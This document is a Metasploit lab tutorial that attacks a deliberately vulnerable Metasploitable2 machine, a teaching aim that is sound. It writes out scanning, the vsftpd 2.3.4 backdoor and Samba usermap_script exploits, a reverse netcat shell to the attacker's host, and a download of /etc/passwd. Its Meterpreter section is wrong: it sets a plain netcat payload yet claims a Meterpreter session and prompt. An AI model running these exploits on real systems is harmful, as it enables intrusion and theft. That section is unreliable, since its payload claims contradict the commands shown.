# █▓▒▒░░░ METASPLOIT: A PRACTICAL EXPLOITATION MANUAL ░░░▒▒▓█

> The Metasploit Framework is the world's leading open-source penetration testing platform. It is a foundational tool for offensive security, providing a systematic way to find, validate, and exploit vulnerabilities. Where Nmap identifies potential weaknesses, Metasploit provides the means to act upon them.
>
> This guide provides a structured workflow for a basic network exploit, from initial scanning to gaining a remote shell.

## 壱 - THE FRAMEWORK: SETUP & CORE CONCEPTS

> Before launching an attack, you must understand your weapon system. Metasploit is a collection of modules, and its primary interface is the `msfconsole`.

### ► **LIVE EXERCISE: Launching the Console**

1. **Initialize the Database:** For performance and data management, the Metasploit database should be running.

   * `sudo systemctl start postgresql`

2. **Launch msfconsole:** This command starts the interactive Metasploit console. The first launch may take a moment to initialize the database.

   * `msfconsole -q`

   * `-q`: Quiet mode. Suppresses the startup banner for a cleaner interface.

   * You will be greeted with the `msf6 >` prompt. This is your command center.

### ► **CORE CONCEPTS: The Building Blocks**

* **Exploit:** A piece of code that takes advantage of a specific vulnerability in a system or application. Its purpose is to deliver a payload.

* **Payload:** The code that runs on the target system *after* the exploit is successful. Payloads can be simple (like spawning a command shell) or complex (like the Meterpreter).

* **Module:** Any component within the Metasploit Framework, including exploits, payloads, auxiliary modules, and post-exploitation modules.

* **Listener:** A process that runs on your machine, waiting for an incoming connection from a payload that has been executed on the target system (a "reverse shell").

## 弐 - THE TARGET: SETTING UP A LAB

> Practicing exploitation requires a safe, legal environment. **Metasploitable2** is a deliberately vulnerable Linux virtual machine designed for this purpose. **Never use these techniques on systems you do not own or have explicit permission to test.**

### ► **LIVE EXERCISE: Deploying the Target**

1. **Download:** Search for and download the Metasploitable2 VMWare/VirtualBox image. The official source is from Rapid7.

2. **Deploy:** Import the downloaded image into your virtualization software (e.g., VirtualBox, VMWare).

3. **Network Configuration:** Configure the VM's network adapter to be on a "Host-only" or "NAT Network". This isolates it from your main network and the internet, creating a private lab environment where only your Kali machine and the target can communicate.

4. **Boot and Identify:** Start the Metasploitable2 VM. It will boot to a login prompt. The default credentials are `msfadmin` / `msfadmin`. Log in and use the `ifconfig` command to find its IP address. This IP is your target.

## 参 - THE WORKFLOW (I): RECONNAISSANCE

> A successful attack begins with accurate intelligence. We will use Nmap *within* Metasploit to scan our target and identify potential attack vectors.

### ► **LIVE EXERCISE: Scanning from msfconsole**

1. **Database Integration:** Metasploit can store scan results in its database, allowing you to easily query and manage host information.

2. **Nmap Scan:** From the `msf6 >` prompt, execute an Nmap scan.

   * `db_nmap -A <target_ip>`

   * `db_nmap`: The Metasploit command to run Nmap and save the results to the database.

   * `-A`: The aggressive scan flag, just as in the Nmap manual.

   * `<target_ip>`: The IP address of your Metasploitable2 VM.

3. **Reviewing Hosts and Services:** Once the scan is complete, you can query the database.

   * `hosts`: Lists all hosts in the database.

   * `services`: Lists all discovered services running on the hosts. Note the services, ports, and version information. This is your list of potential targets.

## 四 - THE WORKFLOW (II): EXPLOITATION

> Now we transition from scanning to attack. We will select a known vulnerability discovered by Nmap, configure an exploit, and launch it against the target.

### ► **LIVE EXERCISE: Gaining Initial Access**

*Our Nmap scan of Metasploitable2 will reveal a vulnerable service: vsftpd version 2.3.4 running on port 21. This version has a known backdoor.*

1. **Search for an Exploit:** Use the `search` command to find a relevant exploit module.

   * `search vsftpd`

   * The results will show an exploit module named `exploit/unix/ftp/vsftpd_234_backdoor`.

2. **Select the Exploit:** Use the `use` command followed by the name or number of the module.

   * `use exploit/unix/ftp/vsftpd_234_backdoor`

   * Your prompt will change to `msf6 exploit(unix/ftp/vsftpd_234_backdoor) >`, indicating you are now in the context of this module.

3. **View Options:** See what parameters need to be configured for this exploit.

   * `show options`

   * You will see a list of options like `RHOSTS` (Remote Hosts). Note which ones are listed as "Required".

4. **Set the Target:** Configure the exploit to point at your Metasploitable2 machine.

   * `set RHOSTS <target_ip>`

5. **Check the Payload:** By default, this exploit uses a simple command shell payload. View the available payloads for this exploit.

   * `show payloads`

   * We will use the default: `cmd/unix/interact`.

6. **Launch the Attack:**

   * `exploit` or `run`

   * If successful, the exploit will trigger the backdoor in the FTP server. You will see a message like "Command shell session 1 opened".

7. **Interact with the Shell:** You now have a remote command shell on the target.

   * Type `whoami`. The result should be `root`.

   * You have successfully compromised the target machine. Type `exit` to leave the shell and return to the `msfconsole` prompt.

## 五 - POST-EXPLOITATION: METERPRETER

> A simple command shell is good, but Metasploit's custom payload, **Meterpreter**, is far more powerful. It's an advanced, in-memory shell with a rich set of features for post-exploitation.

### ► **LIVE EXERCISE: Upgrading to Meterpreter**

*Let's exploit a different service to get a Meterpreter shell. A common vulnerability on Metasploitable2 is with Samba version 3.0.20.*

1. **Find the Exploit:**

   * `search samba usermap script`

   * Select the exploit: `use exploit/multi/samba/usermap_script`

2. **Configure the Exploit:**

   * `show options`

   * `set RHOSTS <target_ip>`

3. **Set a Meterpreter Payload:** This time, we will explicitly set a Meterpreter payload.

   * `set payload cmd/unix/reverse_netcat_gaping`

   * `show options` (Notice the new options for the payload, like `LHOST`)

   * `set LHOST <your_kali_ip>` (Set LHOST to your Kali machine's IP address)

4. **Exploit and Get a Session:**

   * `exploit`

   * A session will be created. You can list active sessions with `sessions`.

5. **Interact with Meterpreter:**

   * `sessions -i <session_id>` (e.g., `sessions -i 2`)

   * Your prompt will change to `meterpreter >`.

6. **Basic Meterpreter Commands:**

   * `sysinfo`: Get system information.

   * `getuid`: See the current user (`root`).

   * `ps`: List running processes.

   * `ls`: List files in the current directory.

   * `download /etc/passwd .`: Download the password file from the target to your current directory on your Kali machine.

   * `exit`: Close the Meterpreter session.

> This manual provides a fundamental overview of an exploit workflow. The Metasploit Framework is exceptionally deep, with thousands of modules for discovery, exploitation, and post-exploitation. Continuous learning and ethical application are paramount.
>
> **// END OF LINE //**
